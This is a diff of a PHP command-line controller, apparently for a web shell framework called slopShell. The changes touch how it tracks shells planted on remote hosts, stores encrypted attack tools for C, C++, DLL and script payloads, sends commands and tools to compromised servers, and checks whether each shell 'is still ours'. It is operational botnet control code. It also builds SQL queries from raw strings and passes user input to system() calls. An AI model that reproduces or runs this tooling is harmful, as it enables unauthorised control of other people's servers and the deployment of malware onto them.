@@ -7,7 +7,6 @@ if (strtolower(php_uname()) == "windows") {
 require "includes/db/postgres_checker.php";
 require "includes/droppers/dynamic_generator.php";
 $firstRun = new postgres_checker();
-$firstRun->createDB();
 $cof = array(
     "sloppy_db" => array(
         "host" => "127.0.0.1",
@@ -25,20 +24,13 @@ $cof = array(
 );
 const response_array = array(
     "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
-    "200" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL,
+    "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
     "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
-    "500" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL
+    "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
 );
-//todo need to figure out why this is no longer working on raspi
-//$te = system("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &");
 is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true)) : define("config", $cof);
-if (empty(config['pass'])) {
-    define('DBCONN', sprintf("host=%s port=%s user=%s dbname=%s",
-        config['sloppy_db']['host'],
-        config['sloppy_db']['port'],
-        config['sloppy_db']['user'],
-        config['sloppy_db']['dbname']
-    ));
+if (empty(config['sloppy_db']['pass'])) {
+    $firstRun->createDB();
 } else {
     define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
         config['sloppy_db']['host'],
@@ -47,6 +39,11 @@ if (empty(config['pass'])) {
         config['sloppy_db']['pass'],
         config['sloppy_db']['dbname']
     ));
+}
+if (empty(config['sloppy_proxies']['proxy_init'])){
+    $firstRun->getProxies('initial');
+}else{
+    echo "proxies built".PHP_EOL;
 }
 define("CHH", curl_init());
 
@@ -181,6 +178,21 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
         if (!empty($pathToFile) && is_file($pathToFile) && !empty($toolName)) {
             $file_parts = pathinfo($pathToFile);
             switch ($file_parts['extension']) {
+                case "cpp":
+                    echo "C++ Source detected.\nMake sure you compile when you upload.\n";
+                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
+                    $language = "cplusplus";
+                    break;
+                case "c++":
+                    echo "C++ Source detected.\nMake sure you compile when you upload.\n";
+                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
+                    $language = "cplusplus";
+                    break;
+                case "c":
+                    echo "C Source detected.\nMake sure you compile when you upload.\n";
+                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
+                    $language = "c";
+                    break;
                 case "sh":
                     echo "Shell script detected.\n";
                     $toolTarget = 'lin';
@@ -209,17 +221,17 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                 case "dll":
                     echo "DLL(Dynamically linked library) detected.\n";
                     $toolTarget = 'win';
-                    $language = 'linked library';
+                    $language = 'unk';
                     break;
                 case "so":
                     echo "Shared Object detected.\n";
                     $toolTarget = 'linux';
-                    $language = 'shared object';
+                    $language = 'unk';
                     break;
                 case "lib":
                     echo "Library detected.\n";
                     $toolTarget = 'linux';
-                    $language = 'library object';
+                    $language = 'unk';
                     break;
                 case "bat":
                     echo "Batch script detected.\n";
@@ -262,13 +274,14 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                     $toolTarget = "unk";
                     $language = "unk";
                 }
-                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
+                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, aad, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                     $toolName,
                     $toolTarget,
                     $ciphered,
                     base64_encode($passphrase),
                     base64_encode($passphraseHmacTagValue),
                     base64_encode($IV),
+                    base64_encode($Oaad),
                     $algo,
                     hash_hmac("sha512", $crypted, $binary = true),
                     $language,
@@ -313,13 +326,14 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                 "aad" => $selected_tool[8]
             ],
             );
+            print(print_r($attack).PHP_EOL);
         } catch (Exception $toolE) {
             echo $toolE->getMessage() . "\n";
             echo $toolE->getTraceAsString() . "\n";
             echo $toolE->getLine() . "\n";
             return 0;
         }
-        awesomeMenu();
+        awesomeMenu('');
         $HOST_GRAB = sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = %d", trim(readline("Which host shall we send this tool to?->")));
         $X = pg_fetch_row(pg_exec($c, $HOST_GRAB));
         array_push($attack, [
@@ -475,7 +489,7 @@ function co($command, $host, bool $encrypt)
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
-                    logo('co', clears, false, '', sprintf('%s%s', $axX[0],$axX[1]));
+                    logo('co', clears, false, '', sprintf('%s%s -> %s', $axX[0],$axX[1], $command));
                     echo $syst;
                     break;
                 default:
@@ -711,19 +725,19 @@ function check($host, $path, $batch)
             if (!curl_errno(CHH)) {
                 switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                     case 200:
-                        logo('co',clears,false, '', sprintf('%s', $axX[0].$axX[1]));
+                        logo('check',clears,false, '', sprintf('%s', $axX[0].$axX[1]));
                         print(sprintf(response_array['200'], $axX[0],$axX[1]));
                         break;
                     case 404:
-                        logo('co',clears,true, 'Shell not found.', sprintf('%s', $axX[0].$axX[1]));
+                        logo('check',clears,true, 'Shell not found.', sprintf('%s', $axX[0].$axX[1]));
                         print(sprintf(response_array['404'], $axX[0],$axX[1]));
                         break;
                     case 500:
-                        logo('co',clears,true, 'Bad User Agent', sprintf('%s', $axX[0].$axX[1]));
+                        logo('check',clears,true, 'Bad User Agent', sprintf('%s', $axX[0].$axX[1]));
                         print(sprintf(response_array['500'], $axX[0],$axX[1]));
                         break;
                     default:
-                        logo('co',clears,true, 'Server still running??', sprintf('%s', $axX[0].$axX[1]));
+                        logo('check',clears,true, 'Server still running??', sprintf('%s', $axX[0].$axX[1]));
                         print(sprintf(response_array['default'], $axX[0],$axX[1]));
                         break;
                 }
@@ -794,7 +808,7 @@ if (strstr(getcwd(), "slopShell") == true) {
     system("git pull");
 } else {
     $homie = readline("Where is slopshell downloaded to?(full path)->");
-    system("cd {$homie} && git pull");
+    system("git pull {$homie}");
 }
 while ($run) {
     $h = null;
